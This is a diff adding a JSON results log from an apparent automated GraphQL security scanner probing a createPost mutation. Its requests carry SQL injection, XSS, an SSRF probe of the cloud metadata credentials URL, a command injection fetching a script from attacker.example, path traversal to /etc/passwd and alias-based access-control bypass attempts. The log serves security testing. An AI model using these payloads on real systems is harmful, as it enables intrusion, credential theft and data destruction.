@@ -1,0 +1,796 @@
+[
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"Hello from API tester\", body: \"This is a normal post body for user-created content.\", userId: \"1\"}) {\n    id\n    title\n    body\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 400,
+    "request_time_seconds": 1.186,
+    "timestamp": "2025-10-05T18:34:36.882412Z",
+    "count": 1,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 116
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"1'); DROP TABLE users; --\", body: \"Testing SQL injection payload in title\", userId: \"1\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.834,
+    "timestamp": "2025-10-05T18:34:39.886946Z",
+    "count": 2,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 106
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"XSS test\", body: \"<script>alert('xss-test')</script><img src=x onerror=alert('img')>\", userId: \"1\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.813,
+    "timestamp": "2025-10-05T18:34:42.706882Z",
+    "count": 3,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 117
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"SSRF probe\", body: \"Please fetch: http://169.254.169.254/latest/meta-data/iam/security-credentials/\", userId: \"1\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.815,
+    "timestamp": "2025-10-05T18:34:45.840416Z",
+    "count": 4,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 132
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"OS command injection test\", body: \"$(curl http://attacker.example/payload.sh); /bin/ls -la /\", userId: \"1\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.916,
+    "timestamp": "2025-10-05T18:34:49.403022Z",
+    "count": 5,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 125
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"../../../../../etc/passwd\", body: \"Path traversal attempt in title\", userId: \"1\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.831,
+    "timestamp": "2025-10-05T18:34:52.933472Z",
+    "count": 6,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 99
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"HTML injection\", body: \"<div><iframe src='http://attacker.example/mal.html'></iframe><p onclick='steal()'>click</p></div>\", userId: \"1\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.856,
+    "timestamp": "2025-10-05T18:34:56.675832Z",
+    "count": 7,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 154
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"Bypass test normal\", body: \"Attempt to create post as another user\", userId: \"2\"}) {\n    id\n    title\n    user {\n      id\n      username\n      email\n      website\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.861,
+        "timestamp": "2025-10-05T18:34:59.331704Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 99
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 1.375,
+        "timestamp": "2025-10-05T18:35:00.706295Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 99
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-05T18:35:00.706356Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.87,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  s: createPost(input: {title: \"Bypass test aliased\", body: \"Alias attempt to bypass deny rules\", userId: \"2\"}) {\n    id\n    title\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.836,
+        "timestamp": "2025-10-05T18:35:04.451139Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 99
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.839,
+        "timestamp": "2025-10-05T18:35:05.290292Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 99
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED"
+              }
+            }
+          ]
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 9,
+    "timestamp": "2025-10-05T18:35:05.290318Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 1.382,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  createPost {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    types {\n      name\n      fields {\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.838,
+    "timestamp": "2025-10-05T18:35:09.447515Z",
+    "count": 10,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"createPost\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"Typo test\", body: \"Testing field suggestions by requesting a misspelled field\", userId: \"1\"}) {\n    id\n    titel\n    bod\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.839,
+    "timestamp": "2025-10-05T18:35:13.253114Z",
+    "count": 11,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"userId\" is not defined by type \"CreatePostInput\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 110
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"titel\" on type \"Post\". Did you mean \"title\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"bod\" on type \"Post\". Did you mean \"body\" or \"id\"?",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"Hello from API tester\", body: \"This is a normal post body for user-created content.\"}) {\n    id\n    title\n    body\n    user {\n      id\n      username\n      email\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.134,
+    "timestamp": "2025-10-05T18:35:52.155785Z",
+    "count": 12,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "createPost": {
+          "id": "101",
+          "title": "Hello from API tester",
+          "body": "This is a normal post body for user-created content.",
+          "user": {
+            "id": null,
+            "username": null,
+            "email": null
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"1'); DROP TABLE posts; --\", body: \"Testing SQL injection vector in title field.\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 1.058,
+    "timestamp": "2025-10-05T18:35:55.621588Z",
+    "count": 13,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "createPost": {
+          "id": "101",
+          "title": "1'); DROP TABLE posts; --",
+          "body": "Testing SQL injection vector in title field."
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"XSS test\", body: \"<script>alert('xss-test')</script><img src=x onerror=alert('img')>\"}) {\n    id\n    title\n    body\n    user {\n      id\n      username\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.844,
+    "timestamp": "2025-10-05T18:35:58.677480Z",
+    "count": 14,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "createPost": {
+          "id": "101",
+          "title": "XSS test",
+          "body": "<script>alert('xss-test')</script><img src=x onerror=alert('img')>",
+          "user": {
+            "id": null,
+            "username": null
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"SSRF probe\", body: \"Please fetch: http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.884,
+    "timestamp": "2025-10-05T18:36:01.733854Z",
+    "count": 15,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "createPost": {
+          "id": "101",
+          "title": "SSRF probe",
+          "body": "Please fetch: http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"OS command injection test\", body: \"$(curl http://attacker.example/payload.sh); /bin/ls -la /\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.863,
+    "timestamp": "2025-10-05T18:36:04.389948Z",
+    "count": 16,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "createPost": {
+          "id": "101",
+          "title": "OS command injection test",
+          "body": "$(curl http://attacker.example/payload.sh); /bin/ls -la /"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"../../../../../etc/passwd\", body: \"Path traversal attempt embedded in title string\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.8,
+    "timestamp": "2025-10-05T18:36:07.698686Z",
+    "count": 17,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "createPost": {
+          "id": "101",
+          "title": "../../../../../etc/passwd",
+          "body": "Path traversal attempt embedded in title string"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"HTML injection\", body: \"<div><iframe src='http://attacker.example/mal.html'></iframe><p onclick='steal()'>click</p></div>\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.903,
+    "timestamp": "2025-10-05T18:36:10.852434Z",
+    "count": 18,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "createPost": {
+          "id": "101",
+          "title": "HTML injection",
+          "body": "<div><iframe src='http://attacker.example/mal.html'></iframe><p onclick='steal()'>click</p></div>"
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"Attempt deny bypass normal\", body: \"Testing access control bypass using a normal mutation invocation.\"}) {\n    id\n    title\n    body\n    user {\n      id\n      username\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.056,
+        "timestamp": "2025-10-05T18:36:13.859390Z",
+        "response_body": {
+          "data": {
+            "createPost": {
+              "id": "101",
+              "title": "Attempt deny bypass normal",
+              "body": "Testing access control bypass using a normal mutation invocation.",
+              "user": {
+                "id": null,
+                "username": null
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.895,
+        "timestamp": "2025-10-05T18:36:14.754143Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "101",
+              "title": "Attempt deny bypass alias",
+              "body": "Testing access control bypass with an alias on the root field."
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 19,
+    "timestamp": "2025-10-05T18:36:14.754209Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.826,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  s: createPost(input: {title: \"Attempt deny bypass alias\", body: \"Testing access control bypass with an alias on the root field.\"}) {\n    id\n    title\n    body\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.842,
+        "timestamp": "2025-10-05T18:36:18.747055Z",
+        "response_body": {
+          "data": {
+            "createPost": {
+              "id": "101",
+              "title": "Attempt deny bypass normal",
+              "body": "Testing access control bypass using a normal mutation invocation.",
+              "user": {
+                "id": null,
+                "username": null
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 1.072,
+        "timestamp": "2025-10-05T18:36:19.819535Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "101",
+              "title": "Attempt deny bypass alias",
+              "body": "Testing access control bypass with an alias on the root field."
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 20,
+    "timestamp": "2025-10-05T18:36:19.819638Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.851,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  createPost {\n    queryType { name }\n    mutationType { name }\n    types {\n      name\n      fields {\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.855,
+    "timestamp": "2025-10-05T18:36:24.315993Z",
+    "count": 21,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"createPost\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  createPost(input: {title: \"Typo test\", body: \"Testing field suggestions by requesting misspelled fields\"}) {\n    id\n    titel\n    bod\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.752,
+    "timestamp": "2025-10-05T18:36:26.919251Z",
+    "count": 22,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"titel\" on type \"Post\". Did you mean \"title\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"bod\" on type \"Post\". Did you mean \"body\" or \"id\"?",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  }
+]
